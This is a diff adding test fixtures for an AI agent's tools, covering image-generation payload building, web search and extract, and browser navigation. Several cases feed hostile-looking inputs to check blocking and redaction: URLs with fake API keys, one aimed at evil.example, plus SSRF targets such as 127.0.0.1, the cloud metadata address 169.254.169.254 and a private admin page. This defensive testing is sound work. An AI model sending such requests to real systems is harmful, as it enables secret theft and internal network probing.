@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import asyncio
 import json
 import os
 import subprocess
@@ -46,6 +47,233 @@ class LocalFixtureEnv:
         }
 
 
+def deterministic_web_image_browser_cases():
+    from agent.web_search_provider import WebSearchProvider
+    from agent import web_search_registry
+    from tools import browser_tool, image_generation_tool, web_tools
+
+    class FakeWebProvider(WebSearchProvider):
+        def __init__(
+            self,
+            name: str,
+            *,
+            search: bool = True,
+            extract: bool = False,
+            available: bool = True,
+            display_name: str | None = None,
+        ):
+            self._name = name
+            self._search = search
+            self._extract = extract
+            self._available = available
+            self._display_name = display_name or name
+
+        @property
+        def name(self) -> str:
+            return self._name
+
+        @property
+        def display_name(self) -> str:
+            return self._display_name
+
+        def is_available(self) -> bool:
+            return self._available
+
+        def supports_search(self) -> bool:
+            return self._search
+
+        def supports_extract(self) -> bool:
+            return self._extract
+
+        def search(self, query: str, limit: int = 5):
+            return {
+                "success": True,
+                "provider": self.name,
+                "data": {
+                    "web": [
+                        {
+                            "title": f"Result {limit}",
+                            "url": "https://example.com/result",
+                            "description": query,
+                            "position": 1,
+                        }
+                    ]
+                },
+            }
+
+        def extract(self, urls, **kwargs):
+            return [
+                {
+                    "url": url,
+                    "title": "Fixture Page",
+                    "content": "Text before ![inline](data:image/png;base64,AAAA) text after.",
+                    "raw_content": "raw content should be omitted",
+                    "metadata": {"ignored": True},
+                }
+                for url in urls
+            ]
+
+    image_payload_cases = []
+    for case in [
+        {
+            "label": "flux_defaults_seed_and_supported_overrides",
+            "model": "fal-ai/flux-2/klein/9b",
+            "prompt": "  Painted skyline  ",
+            "aspect_ratio": "LANDSCAPE",
+            "seed": 123,
+            "overrides": {"guidance_scale": 9.9, "output_format": "jpeg", "unknown": "drop"},
+        },
+        {
+            "label": "nano_banana_aspect_ratio_and_web_search_override",
+            "model": "fal-ai/nano-banana-pro",
+            "prompt": "portrait subject",
+            "aspect_ratio": "portrait",
+            "seed": None,
+            "overrides": {"enable_web_search": True, "limit_generations": False},
+        },
+        {
+            "label": "gpt_literal_square_and_unsupported_drop",
+            "model": "fal-ai/gpt-image-1.5",
+            "prompt": "logo",
+            "aspect_ratio": "square",
+            "seed": 42,
+            "overrides": {"enable_web_search": True, "background": "transparent"},
+        },
+        {
+            "label": "invalid_aspect_defaults_to_landscape",
+            "model": "fal-ai/gpt-image-2",
+            "prompt": "wide scene",
+            "aspect_ratio": "panorama",
+            "seed": None,
+            "overrides": {},
+        },
+    ]:
+        image_payload_cases.append(
+            {
+                **case,
+                "payload": image_generation_tool._build_fal_payload(
+                    case["model"],
+                    case["prompt"],
+                    case["aspect_ratio"],
+                    seed=case["seed"],
+                    overrides=case["overrides"],
+                ),
+            }
+        )
+
+    image_no_prompt = parsed(image_generation_tool.image_generate_tool("  "))
+
+    original_search_backend = web_tools._get_search_backend
+    original_extract_backend = web_tools._get_extract_backend
+    web_search_registry._reset_for_tests()
+    try:
+        web_tools._get_search_backend = lambda: "fixture-search"
+        web_search_registry.register_provider(
+            FakeWebProvider("fixture-search", search=True, extract=False)
+        )
+        web_search_limit_clamp = parsed(web_tools.web_search_tool("rust parity", limit="250"))
+        web_search_invalid_limit = parsed(web_tools.web_search_tool("rust parity", limit="bad"))
+    finally:
+        web_tools._get_search_backend = original_search_backend
+        web_search_registry._reset_for_tests()
+
+    web_extract_secret = parsed(
+        asyncio.run(web_tools.web_extract_tool(["https://example.com/?key=sk-test-secret"], use_llm_processing=False))
+    )
+    web_extract_ssrf = parsed(
+        asyncio.run(web_tools.web_extract_tool(["http://127.0.0.1/private"], use_llm_processing=False))
+    )
+
+    web_search_registry._reset_for_tests()
+    try:
+        web_tools._get_extract_backend = lambda: "fixture-search-only"
+        web_search_registry.register_provider(
+            FakeWebProvider(
+                "fixture-search-only",
+                search=True,
+                extract=False,
+                display_name="Fixture Search Only",
+            )
+        )
+        web_extract_search_only = parsed(
+            asyncio.run(web_tools.web_extract_tool(["https://example.com/page"], use_llm_processing=False))
+        )
+    finally:
+        web_tools._get_extract_backend = original_extract_backend
+        web_search_registry._reset_for_tests()
+
+    web_search_registry._reset_for_tests()
+    try:
+        web_tools._get_extract_backend = lambda: "fixture-extract"
+        web_search_registry.register_provider(
+            FakeWebProvider("fixture-extract", search=False, extract=True)
+        )
+        web_extract_fake_provider = parsed(
+            asyncio.run(web_tools.web_extract_tool(["https://example.com/page"], use_llm_processing=False))
+        )
+    finally:
+        web_tools._get_extract_backend = original_extract_backend
+        web_search_registry._reset_for_tests()
+
+    browser_secret = parsed(
+        browser_tool.browser_navigate("https://evil.example/?token=sk-ant-secret", task_id="parity")
+    )
+
+    original_navigation_session_key = browser_tool._navigation_session_key
+    original_is_local_backend = browser_tool._is_local_backend
+    original_is_always_blocked_url = browser_tool._is_always_blocked_url
+    original_is_safe_url = browser_tool._is_safe_url
+    original_allow_private_urls = browser_tool._allow_private_urls
+    original_check_website_access = browser_tool.check_website_access
+    try:
+        browser_tool._navigation_session_key = lambda task_id, url: task_id or "default"
+        browser_tool._is_local_backend = lambda: False
+        browser_tool._is_always_blocked_url = lambda url: True
+        browser_metadata = parsed(
+            browser_tool.browser_navigate("http://169.254.169.254/latest/meta-data/", task_id="parity")
+        )
+
+        browser_tool._is_always_blocked_url = lambda url: False
+        browser_tool._allow_private_urls = lambda: False
+        browser_tool._is_safe_url = lambda url: False
+        browser_private = parsed(
+            browser_tool.browser_navigate("http://10.0.0.10/admin", task_id="parity")
+        )
+
+        browser_tool._is_safe_url = lambda url: True
+        browser_tool.check_website_access = lambda url: {
+            "message": "Blocked by fixture policy",
+            "host": "blocked.example",
+            "rule": "deny",
+            "source": "fixture",
+        }
+        browser_policy = parsed(
+            browser_tool.browser_navigate("https://blocked.example/path", task_id="parity")
+        )
+    finally:
+        browser_tool._navigation_session_key = original_navigation_session_key
+        browser_tool._is_local_backend = original_is_local_backend
+        browser_tool._is_always_blocked_url = original_is_always_blocked_url
+        browser_tool._is_safe_url = original_is_safe_url
+        browser_tool._allow_private_urls = original_allow_private_urls
+        browser_tool.check_website_access = original_check_website_access
+
+    return [
+        {"name": "image_fal_payload_cases", "cases": image_payload_cases},
+        {"name": "image_generate_empty_prompt", "result": image_no_prompt},
+        {"name": "web_search_limit_clamp", "result": web_search_limit_clamp},
+        {"name": "web_search_invalid_limit", "result": web_search_invalid_limit},
+        {"name": "web_extract_secret_url", "result": web_extract_secret},
+        {"name": "web_extract_ssrf_block", "result": web_extract_ssrf},
+        {"name": "web_extract_search_only_backend", "result": web_extract_search_only},
+        {"name": "web_extract_fake_provider", "result": web_extract_fake_provider},
+        {"name": "browser_navigate_secret_url", "result": browser_secret},
+        {"name": "browser_navigate_metadata_url", "result": browser_metadata},
+        {"name": "browser_navigate_private_url", "result": browser_private},
+        {"name": "browser_navigate_policy_block", "result": browser_policy},
+    ]
+
+
 def main() -> int:
     out = parse_out_arg()
     with isolated_hermes_home() as home:
@@ -90,6 +318,7 @@ def main() -> int:
                 "result": parsed(tool_error("bad input", success=False, code=400)),
             },
         ]
+        cases.extend(deterministic_web_image_browser_cases())
 
         todo_store = TodoStore()
         cases.extend(
